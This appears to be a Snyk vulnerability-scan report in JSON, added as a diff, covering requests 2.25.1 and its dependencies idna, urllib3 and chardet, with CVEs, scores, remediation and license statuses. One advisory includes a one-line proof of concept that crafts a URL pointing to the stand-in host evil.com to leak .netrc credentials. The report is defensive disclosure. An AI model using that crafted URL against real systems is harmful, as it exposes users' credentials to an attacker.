@@ -1,0 +1,859 @@
+{
+  "vulnerabilities": [
+    {
+      "id": "SNYK-PYTHON-IDNA-6597975",
+      "title": "Resource Exhaustion",
+      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "credit": [
+        "Guido Vranken"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,3.7)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "3.7"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6.2,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "idna",
+      "references": [
+        {
+          "url": "https://github.com/kjd/idna/commit/5beb28b9dd77912c0dd656d8b0fdba3eb80222e7",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 7.5,
+          "modificationTime": "2024-07-12T01:11:33.489034Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 6.5,
+          "modificationTime": "2024-04-13T13:34:24.252619Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 6.5,
+          "modificationTime": "2024-04-29T11:06:26.676135Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-07-19T07:23:30.080713Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "NVD",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-07-12T01:11:33.489034Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 6.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-04-13T13:34:24.252619Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-04-29T11:06:26.676135Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Resource Exhaustion via the `idna.encode` function. An attacker can consume significant resources and potentially cause a denial-of-service by supplying specially crafted arguments to this function. \r\n\r\n**Note:**\r\nThis is triggered by arbitrarily large inputs that would not occur in normal usage but may be passed to the library assuming there is no preliminary input validation by the higher-level application.\n## Remediation\nUpgrade `idna` to version 3.7 or higher.\n## References\n- [GitHub Commit](https://github.com/kjd/idna/commit/5beb28b9dd77912c0dd656d8b0fdba3eb80222e7)\n",
+      "epssDetails": {
+        "percentile": "0.55959",
+        "probability": "0.00338",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2024-3651"
+        ],
+        "CWE": [
+          "CWE-400"
+        ],
+        "GHSA": [
+          "GHSA-jjg7-2v4v-x38h"
+        ]
+      },
+      "packageName": "idna",
+      "proprietary": false,
+      "creationTime": "2024-04-12T07:07:33.284260Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2024-04-11T21:32:40Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2024-04-12T07:20:32.228734Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2024-07-19T07:23:30.080713Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1",
+        "idna@2.10"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "idna",
+      "version": "2.10"
+    },
+    {
+      "id": "SNYK-PYTHON-REQUESTS-10305723",
+      "title": "Insertion of Sensitive Information Into Sent Data",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N/E:P",
+      "credit": [
+        "Juho ForsÃ©n"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[0,2.32.4)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.32.4"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 5.7,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "requests",
+      "references": [
+        {
+          "url": "https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/issues/6964",
+          "title": "GitHub Issue"
+        },
+        {
+          "url": "https://github.com/psf/requests/pull/6962",
+          "title": "GitHub PR"
+        },
+        {
+          "url": "https://github.com/psf/requests/pull/6963",
+          "title": "GitHub PR"
+        },
+        {
+          "url": "https://github.com/psf/requests/pull/6965",
+          "title": "GitHub PR"
+        },
+        {
+          "url": "https://seclists.org/fulldisclosure/2025/Jun/2",
+          "title": "Seclists Full Disclosure"
+        },
+        {
+          "url": "https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py%23L240-L245",
+          "title": "Vulnerable Code"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "cvssV3BaseScore": 5.3,
+          "modificationTime": "2025-06-11T06:06:18.010356Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvssV3BaseScore": 5.9,
+          "modificationTime": "2025-06-19T11:06:10.871824Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.7,
+          "cvssVersion": "4.0",
+          "modificationTime": "2025-06-10T07:56:18.109832Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-06-10T07:56:18.109832Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-06-11T06:06:18.010356Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-06-19T11:06:10.871824Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.\n\n**Note:**\n\nThis is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's \"intended\" part (e.g., `example.com` in `http://example.com:@evil.com/`).\n## PoC\n```\nrequests.get('http://example.com:@evil.com/&apos;)\n```\n## Remediation\nUpgrade `requests` to version 2.32.4 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b)\n- [GitHub Commit](https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae)\n- [GitHub Commit](https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef)\n- [GitHub Issue](https://github.com/psf/requests/issues/6964)\n- [GitHub PR](https://github.com/psf/requests/pull/6962)\n- [GitHub PR](https://github.com/psf/requests/pull/6963)\n- [GitHub PR](https://github.com/psf/requests/pull/6965)\n- [Seclists Full Disclosure](https://seclists.org/fulldisclosure/2025/Jun/2)\n- [Vulnerable Code](https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245)\n",
+      "epssDetails": {
+        "percentile": "0.06090",
+        "probability": "0.00028",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2024-47081"
+        ],
+        "CWE": [
+          "CWE-201"
+        ]
+      },
+      "packageName": "requests",
+      "proprietary": false,
+      "creationTime": "2025-06-06T14:13:30.499302Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2025-06-04T10:59:08Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2025-06-06T14:13:30.934934Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2025-06-19T11:06:10.871824Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "requests",
+      "version": "2.25.1"
+    },
+    {
+      "id": "SNYK-PYTHON-REQUESTS-5595532",
+      "title": "Information Exposure",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N/E:P",
+      "credit": [
+        "Dennis Brinkrolf",
+        "Tobias Funke"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.3.0,2.31.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.31.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "requests",
+      "references": [
+        {
+          "url": "https://github.com/psf/requests/commit/74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/releases/tag/v2.31.0",
+          "title": "GitHub Release"
+        },
+        {
+          "url": "https://github.com/hardikmodha/POC-CVE-2023-32681",
+          "title": "PoC"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "cvssV3BaseScore": 6.1,
+          "modificationTime": "2024-03-11T09:53:17.886423Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "cvssV3BaseScore": 6.1,
+          "modificationTime": "2024-03-11T09:54:01.306591Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "cvssV3BaseScore": 6.1,
+          "modificationTime": "2024-03-11T09:53:25.798245Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-11-19T12:47:17.817815Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 6.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:17.886423Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 6.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:54:01.306591Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:25.798245Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Information Exposure by leaking `Proxy-Authorization` headers to destination servers during redirects to an HTTPS origin. This is a result of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. \r\n\r\n**NOTE:** This behavior has only been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`), and only when redirecting to HTTPS:\r\n\r\n1) HTTP â†’ HTTPS: leak\r\n\r\n2) HTTPS â†’ HTTP: no leak\r\n\r\n3) HTTPS â†’ HTTPS: leak\r\n\r\n4) HTTP â†’ HTTP: no leak\r\n\r\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the `CONNECT` request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\r\n\r\n## Workaround\r\n\r\nThis vulnerability can be avoided by setting `allow_redirects` to `False` on all calls through Requests top-level APIs, and then capturing the 3xx response codes to make a new request to the redirect destination.\n## Remediation\nUpgrade `requests` to version 2.31.0 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5)\n- [GitHub Release](https://github.com/psf/requests/releases/tag/v2.31.0)\n- [PoC](https://github.com/hardikmodha/POC-CVE-2023-32681)\n",
+      "epssDetails": {
+        "percentile": "0.90433",
+        "probability": "0.06121",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2023-32681"
+        ],
+        "CWE": [
+          "CWE-200"
+        ],
+        "GHSA": [
+          "GHSA-j8r2-6x86-q33q"
+        ]
+      },
+      "packageName": "requests",
+      "proprietary": false,
+      "creationTime": "2023-05-23T05:06:29.304486Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2023-05-22T20:36:32Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2023-05-23T06:40:58.774103Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2024-11-19T12:47:17.817815Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "requests",
+      "version": "2.25.1"
+    },
+    {
+      "id": "SNYK-PYTHON-REQUESTS-6928867",
+      "title": "Always-Incorrect Control Flow Implementation",
+      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+      "credit": [
+        "Mike Assel"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.32.2)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.32.2"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": "This vulnerability is only applicable when the first request is sent with the parameter`verify=False`."
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 5.6,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "requests",
+      "references": [
+        {
+          "url": "https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/pull/6655",
+          "title": "GitHub PR"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+          "cvssV3BaseScore": 5.6,
+          "modificationTime": "2024-05-21T14:16:16.890088Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N",
+          "cvssV3BaseScore": 6,
+          "modificationTime": "2024-06-01T11:01:53.528228Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-09-12T12:22:19.215004Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-05-21T14:16:16.890088Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-06-01T11:01:53.528228Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Always-Incorrect Control Flow Implementation when making requests through a Requests `Session`. An attacker can bypass certificate verification by making the first request with `verify=False`, causing all subsequent requests to ignore certificate verification regardless of changes to the `verify` value.\r\n\r\n**Notes:**\r\n\r\n1) For requests <2.32.0, avoid setting `verify=False` for the first request to a host while using a Requests Session.\r\n\r\n2) For requests <2.32.0, call `close()` on Session objects to clear existing connections if `verify=False` is used.\r\n\r\n3) This vulnerability was initially fixed in version [2.32.0](https://pypi.org/project/requests/2.32.0/), which was yanked. Therefore, the next available fixed version is 2.32.2.\n## Remediation\nUpgrade `requests` to version 2.32.2 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac)\n- [GitHub PR](https://github.com/psf/requests/pull/6655)\n",
+      "epssDetails": {
+        "percentile": "0.07778",
+        "probability": "0.00033",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2024-35195"
+        ],
+        "CWE": [
+          "CWE-670"
+        ],
+        "GHSA": [
+          "GHSA-9wx4-h78v-vm56"
+        ]
+      },
+      "packageName": "requests",
+      "proprietary": false,
+      "creationTime": "2024-05-21T05:56:39.394534Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2024-05-20T20:40:31Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2024-05-21T06:19:05.834197Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2024-09-12T12:22:19.215004Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "requests",
+      "version": "2.25.1"
+    },
+    {
+      "id": "SNYK-PYTHON-URLLIB3-10390194",
+      "title": "Open Redirect",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "credit": [
+        "Jacob Sandum"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.5.0)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.5.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "urllib3",
+      "references": [
+        {
+          "url": "https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "cvssV3BaseScore": 5.3,
+          "modificationTime": "2025-06-19T13:36:01.860093Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "cvssV3BaseScore": 5.3,
+          "modificationTime": "2025-08-09T11:01:51.385912Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6,
+          "cvssVersion": "4.0",
+          "modificationTime": "2025-06-19T10:33:10.780903Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-06-19T10:33:10.780903Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-06-19T13:36:01.860093Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-08-09T11:01:51.385912Z"
+        }
+      ],
+      "description": "## Overview\n[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.\n\nAffected versions of this package are vulnerable to Open Redirect due to the `retries` parameter being ignored during `PoolManager` instantiation. An attacker can access unintended resources or endpoints by leveraging automatic redirects when the application expects redirects to be disabled at the connection pool level.\r\n\r\n**Note:**\r\n\r\n`requests` and `botocore` users are not affected.\r\n\r\n## Workaround\r\n\r\nThis can be mitigated by disabling redirects at the `request()` level instead of the `PoolManager()` level.\n## Remediation\nUpgrade `urllib3` to version 2.5.0 or higher.\n## References\n- [GitHub Commit](https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857)\n",
+      "epssDetails": {
+        "percentile": "0.01985",
+        "probability": "0.00015",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2025-50181"
+        ],
+        "CWE": [
+          "CWE-601"
+        ],
+        "GHSA": [
+          "GHSA-pq67-6m6q-mj2v"
+        ]
+      },
+      "packageName": "urllib3",
+      "proprietary": false,
+      "creationTime": "2025-06-19T07:42:26.685719Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2025-06-18T17:50:00Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2025-06-19T10:33:10.764765Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2025-08-09T11:01:51.385912Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1",
+        "urllib3@1.26.20"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "urllib3",
+      "version": "1.26.20"
+    },
+    {
+      "id": "snyk:lic:pip:chardet:LGPL-2.1",
+      "type": "license",
+      "title": "LGPL-2.1 license",
+      "semver": {
+        "vulnerable": [
+          "[0,)"
+        ]
+      },
+      "license": "LGPL-2.1",
+      "language": "python",
+      "description": "LGPL-2.1 license",
+      "packageName": "chardet",
+      "creationTime": "2025-03-08T06:54:02.050Z",
+      "packageManager": "pip",
+      "publicationTime": "2025-03-08T06:54:02.050Z",
+      "severity": "medium",
+      "severityWithCritical": "medium",
+      "from": [
+        "tmpz4yiwchy@0.0.0",
+        "requests@2.25.1",
+        "chardet@4.0.0"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "chardet",
+      "version": "4.0.0"
+    }
+  ],
+  "packages": [
+    {
+      "name": "requests",
+      "version": "2.25.1",
+      "upload_time": "2020-12-16T19:38:34.329342Z",
+      "download_url": "https://files.pythonhosted.org/packages/29/c1/24814557f1d22c56d50280771a17307e6bf87b70727d975fd6b2ce6b014a/requests-2.25.1-py2.py3-none-any.whl",
+      "count_vulnerabilities": 5,
+      "status": "rejected",
+      "licenses": [
+        "Apache 2.0"
+      ],
+      "license_rejected": false,
+      "dependencies": [
+        {
+          "name": "certifi",
+          "version": "2025.8.3",
+          "upload_time": "2025-08-03T03:07:45.777225Z",
+          "download_url": "https://files.pythonhosted.org/packages/e5/48/1549795ba7742c948d2ad169c1c8cdbae65bc450d6cd753d124b17c8cd32/certifi-2025.8.3-py3-none-any.whl",
+          "count_vulnerabilities": 0,
+          "status": "approved",
+          "licenses": [
+            "MPL-2.0"
+          ],
+          "license_rejected": false,
+          "dependencies": []
+        },
+        {
+          "name": "chardet",
+          "version": "4.0.0",
+          "upload_time": "2020-12-10T19:35:32.469759Z",
+          "download_url": "https://files.pythonhosted.org/packages/19/c7/fa589626997dd07bd87d9269342ccb74b1720384a4d739a1872bd84fbe68/chardet-4.0.0-py2.py3-none-any.whl",
+          "count_vulnerabilities": 0,
+          "status": "rejected",
+          "licenses": [
+            "LGPL-2.1"
+          ],
+          "license_rejected": true,
+          "dependencies": []
+        },
+        {
+          "name": "idna",
+          "version": "2.10",
+          "upload_time": "2020-06-27T23:45:03.457785Z",
+          "download_url": "https://files.pythonhosted.org/packages/a2/38/928ddce2273eaa564f6f50de919327bf3a00f091b5baba8dfa9460f3a8a8/idna-2.10-py2.py3-none-any.whl",
+          "count_vulnerabilities": 1,
+          "status": "rejected",
+          "licenses": [
+            "BSD-like"
+          ],
+          "license_rejected": false,
+          "dependencies": []
+        },
+        {
+          "name": "urllib3",
+          "version": "1.26.20",
+          "upload_time": "2024-08-29T15:43:08.921610Z",
+          "download_url": "https://files.pythonhosted.org/packages/33/cf/8435d5a7159e2a9c83a95896ed596f68cf798005fe107cc655b5c5c14704/urllib3-1.26.20-py2.py3-none-any.whl",
+          "count_vulnerabilities": 1,
+          "status": "rejected",
+          "licenses": [
+            "MIT"
+          ],
+          "license_rejected": false,
+          "dependencies": []
+        }
+      ]
+    }
+  ]
+}
